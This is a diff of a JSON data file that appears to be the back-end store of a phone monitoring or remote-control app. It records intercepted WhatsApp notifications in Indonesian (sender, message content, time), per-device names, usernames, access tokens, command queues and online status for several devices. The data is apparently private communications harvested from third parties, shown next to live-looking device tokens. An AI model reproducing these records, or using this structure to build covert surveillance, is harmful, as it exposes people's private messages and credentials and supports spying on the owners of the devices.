@@ -22,6 +22,22 @@
     "smsMessages": [
       {
         "appName": "WhatsApp",
+        "sender": "‎𝐒𝐓𝐌 𝐒𝐔𝐒𝐔 𝐃𝐀𝐍𝐂𝐀𝐖𝟕𝟕𝟕 ᵛ¹ (474 pesan): ~ rambararam",
+        "content": "coba minta tolong masukin rama dong",
+        "time": "29/04 22:12",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777471317031
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎2390 pesan dari 20 chat",
+        "time": "29/04 22:12",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777471312981
+      },
+      {
+        "appName": "WhatsApp",
         "sender": "‎𝐒𝐓𝐌 𝐒𝐔𝐒𝐔 𝐃𝐀𝐍𝐂𝐀𝐖𝟕𝟕𝟕 ᵛ¹ (473 pesan): ~ rambararam",
         "content": "🎤 Pesan suara (0.06)",
         "time": "29/04 22:12",
@@ -4003,22 +4019,6 @@
         "time": "29/04 22:07",
         "pkg": "com.whatsapp",
         "receivedAt": 1777470990720
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎𝐓𝐚𝐠 𝐬𝐰 𝟑 (365 pesan): ~ abdy",
-        "content": "Menyebut grup Anda secara privat di status",
-        "time": "29/04 22:07",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1777470990662
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎𝟐𝟐𝟓 𝐀𝐑𝐄𝐀 𝐕𝟐 (49 pesan): ~ someone",
-        "content": "stres.",
-        "time": "29/04 22:07",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1777470990524
       }
     ],
     "galleryPhotos": [],
@@ -4069,7 +4069,7 @@
     "deviceName": "HP-AGUSGANTENG123-3E9A",
     "ownerUsername": "zaa",
     "token": "20fdcadc903f75b92eda3edefa92e509",
-    "lastSeen": 1777471311179,
+    "lastSeen": 1777471314238,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-27T07:37:12.639Z",
@@ -17949,7 +17949,7 @@
     "deviceName": "HP-ZAL7SEX-5D7C",
     "ownerUsername": "Zal7Sex",
     "token": "b806a84b0d2764047b5cb1e5906b7b55",
-    "lastSeen": 1777471310343,
+    "lastSeen": 1777471316520,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-29T13:43:11.417Z",
